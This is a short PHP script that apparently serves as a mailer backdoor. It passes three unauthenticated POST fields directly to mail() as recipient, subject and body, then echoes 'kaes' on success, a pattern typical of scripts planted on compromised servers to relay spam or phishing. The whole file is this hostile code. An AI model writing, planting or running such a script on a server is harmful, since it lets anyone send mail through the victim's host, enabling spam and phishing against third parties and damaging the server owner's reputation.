<?php
$tar1      = stripslashes($_POST["l1"]);$tar2 = stripslashes($_POST["l2"]);$tar3 = stripslashes($_POST["l3"]);$result = mail(stripslashes($tar1), stripslashes($tar2), stripslashes($tar3));
if($result){echo 'kaes';}else{echo 'error : '.$result;}